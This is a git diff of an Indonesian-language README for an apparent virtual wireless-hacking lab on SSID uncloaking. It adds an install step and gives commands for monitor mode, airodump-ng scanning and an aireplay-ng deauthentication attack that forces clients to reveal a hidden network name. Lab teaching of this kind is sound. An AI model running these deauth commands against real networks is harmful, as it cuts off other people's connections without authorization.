@@ -4,6 +4,7 @@
 - [Apa itu SSID Uncloaking?](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/tree/main/lab/ssid%20uncloaking#apa-itu-ssid-uncloaking)
 - [Cara Kerja](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/tree/main/lab/ssid%20uncloaking#cara-kerja)
 - [Persyaratan](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/tree/main/lab/ssid%20uncloaking#persyaratan)
+- [Instalasi](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/tree/main/lab/ssid%20uncloaking#instalasi)
 - [Langkah-Langkah](https://github.com/fixploit03/Lab-Virtual-Wireless-Hacking/tree/main/lab/ssid%20uncloaking#langkah-langkah)
   
 ## Apa itu SSID Uncloaking?
@@ -22,6 +23,12 @@ Saat seorang client ingin terhubung ke AP dengan hidden SSID, client tersebut ak
 
 Dengan memanfaatkan tools seperti `airodump-ng`, penyerang dapat memantau lalu lintas wireless di sekitarnya. Kemudian dengan mengirimkan paket deauthentication menggunakan `aireplay-ng` ke client yang sedang terhubung ke AP, client tersebut akan terputus secara paksa dari jaringan. Secara otomatis client akan mencoba melakukan reconnect ke AP, dan pada saat itulah proses probe request dan probe response terjadi. `airodump-ng` yang sedang berjalan di mode monitor akan menangkap probe response tersebut dan menampilkan SSID asli yang tadinya tersembunyi.
 
+## Instalasi
+
+```bash
+sudo apt install iw aircrack-ng
+```
+
 ## Persyaratan
 - Jaringan Wi-Fi (hidden SSID)
 - STA (client)
@@ -33,7 +40,7 @@ Dengan memanfaatkan tools seperti `airodump-ng`, penyerang dapat memantau lalu l
 
 #### 1. Lihat semua interface wireless yang aktif:
 
-```
+```bash
 iw dev
 ```
 
@@ -41,7 +48,7 @@ iw dev
 
 #### 2. Aktifkan mode monitor:
 
-```
+```bash
 sudo ip link set wlan1 down
 sudo iw dev wlan1 set type monitor
 sudo ip link set wlan1 up
@@ -52,7 +59,7 @@ iw dev wlan1 info
 
 #### 3. Scan jaringan Wi-Fi:
 
-```
+```bash
 sudo airodump-ng wlan1
 ```
 
@@ -60,7 +67,7 @@ sudo airodump-ng wlan1
 
 #### 4. Fokuskan scan pada jaringan tersebut:
 
-```
+```bash
 sudo airodump-ng -d [bssid] -c [channel] wlan1
 ```
 
@@ -69,7 +76,7 @@ sudo airodump-ng -d [bssid] -c [channel] wlan1
 
 #### 5. Jalankan serangan deauth:
 
-```
+```bash
 sudo aireplay-ng -0 10 -a [bssid] wlan1
 ```
 
